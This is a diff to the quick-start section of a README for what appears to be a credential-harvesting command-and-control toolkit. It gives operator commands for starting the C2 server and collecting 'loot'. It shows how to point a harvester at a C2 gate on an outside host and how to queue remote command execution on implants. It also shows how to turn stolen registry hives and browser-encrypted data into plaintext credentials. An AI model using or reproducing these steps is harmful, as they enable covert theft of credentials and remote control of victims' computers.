@@ -111,12 +111,18 @@ goal is quiet, not invisible. Full defender view: `docs/TECHNIQUES.md`.
 
 ## Quick start
 
-**1 — Operator: start the C2**
+**0 — Operator: one-time setup** (creates `.venv` with everything — no PATH pip needed)
 
-```bash
-cd server
-python collector.py --port 8443 --psk SECRET --auth opstoken \
-                    --allow 10.0.0.0/8 --loot-dir ../loot
+```powershell
+powershell -ExecutionPolicy Bypass -File tools\setup_env.ps1
+```
+
+**1 — Operator: start the C2** (always via the venv interpreter, from the repo root)
+
+```powershell
+.venv\Scripts\python.exe server\collector.py --port 8443 --bind 0.0.0.0 `
+    --auth opstoken --loot-dir "C:\your\loot-dir"
+# psk resolves from server\psk.txt (written by build.bat); pass --psk to override.
 # optionally TLS: --tls-cert cert.pem --tls-key key.pem
 ```
 
@@ -137,12 +143,14 @@ python3 sh_harvest.py --c2 http://YOUR.HOST:8443/gate --psk SECRET --auth opstok
 
 **4 — Watch loot land, task implants, unlock everything**
 
-```bash
-python server/tui.py                                    # live console (watch mode)
-python server/c2ctl.py queue HOST-user --exec "whoami"  # remote exec → returns as loot
-python server/parse_loot.py                             # bundle → creds/report
-python server/offline_unlock.py --bundle loot/HOST-...  # hives+ABE → plaintext
+```powershell
+.venv\Scripts\python.exe server\tui.py                                          # live console
+.venv\Scripts\python.exe server\c2ctl.py queue --loot-dir "C:\your\loot-dir" HOST-user --exec "whoami"
+.venv\Scripts\python.exe server\parse_loot.py                                   # bundle -> creds
+.venv\Scripts\python.exe server\offline_unlock.py --bundle <bundle-dir>         # hives+ABE -> plaintext
 ```
+
+(On POSIX: `python3` after `pip install -r requirements.txt` — targets need **zero** dependencies.)
 
 ## Repository layout
 
